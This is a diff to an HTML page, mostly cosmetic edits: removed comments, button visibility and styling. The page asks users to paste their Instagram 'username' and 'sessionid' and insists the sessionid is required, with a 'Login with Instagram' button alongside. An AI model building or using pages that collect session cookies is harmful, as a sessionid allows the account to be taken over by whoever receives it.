@@ -8,7 +8,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Quantico:wght@700&display=swap" rel="stylesheet" />
 
   <style>
-    /* --- Base Styling --- */
     body {
       margin: 0;
       height: 100vh;
@@ -21,7 +20,6 @@
       overflow: hidden;
     }
 
-    /* --- Container --- */
     .container {
       background: rgba(20, 0, 0, 0.85);
       border: 1px solid rgba(255, 0, 0, 0.25);
@@ -85,8 +83,7 @@
       border-radius: 10px;
       cursor: pointer;
       transition: 0.3s ease, opacity 0.6s ease;
-      box-shadow: 0 0 10px rgba(255,0,0,0.4), 0 0 25px rgba(255,0,0,0.3);
-      opacity: 0; /* hidden initially */
+      opacity: 0; /* hidden initially except Load User */
     }
 
     button:hover:not(:disabled) {
@@ -116,7 +113,6 @@
       text-shadow:0 0 10px #ff8080,0 0 25px #ff3333;
     }
 
-    /* --- Instagram Login Button (hidden by default) --- */
     .insta-btn {
       margin-top: 30px;
       background: linear-gradient(45deg, #ff0040, #ff6600, #ffcc00);
@@ -147,7 +143,6 @@
       box-shadow: 0 0 30px rgba(255,0,0,0.6), 0 0 60px rgba(255,50,50,0.5);
     }
 
-    /* --- Note styles --- */
     #sessionWarning {
       color:#ff6666;
       font-size:0.95rem;
@@ -177,19 +172,17 @@
 
     <textarea id="pasteInput" placeholder="Enter your 'username' and 'sessionid'"></textarea>
     <br />
-    <button id="loadBtn">Load User</button>
+    <button id="loadBtn" style="opacity:1;">Load User</button> <!-- visible initially -->
     <br />
     <button id="sendBtn" disabled>Send</button>
 
     <div id="statusMessage" class="status"></div>
 
-    <!-- Instagram Login Button -->
     <button id="loginInstagramBtn" class="insta-btn">
       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
       Login with Instagram
     </button>
 
-    <!-- Bottom Note -->
     <p id="sessionWarning">
       ⚠️ You are required to enter sessionid if 'Load User' does not work ⚠️
     </p>
@@ -236,7 +229,6 @@
           statusMessage.classList.add('success');
           pasteInput.value = '';
           
-          // Show Instagram Login button
           loginInstagramBtn.style.display = 'inline-flex';
           loginInstagramBtn.style.opacity = '1';
         } else if (data.error) {
@@ -264,7 +256,6 @@
       sessionWarning.style.opacity = '1';
     });
 
-    // Instagram login + popup
     loginInstagramBtn.addEventListener('click', () => {
       const authUrl = "https://www.instagram.com/";
 
